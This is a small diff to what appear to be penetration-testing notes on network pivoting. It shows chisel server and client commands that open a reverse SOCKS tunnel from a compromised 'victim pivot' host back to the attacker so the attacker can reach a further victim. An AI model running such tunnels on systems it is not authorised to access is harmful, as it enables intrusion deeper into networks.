@@ -14,7 +14,7 @@ Attacker <-------- Victim Pivot <-------- Next Victim
 * In this scenario all ports from the victim pivot point aer redirected to attacker so attacker can access Next Victim, which
 would be othervise not visible for his network adapter
 
- chisel server -p 3333 --reverse --socks5
+./chisel server -p 3333 --reverse --socks5
 
 ./chisel_lin client 172.16.40.5:3333 R:7777:socks
 
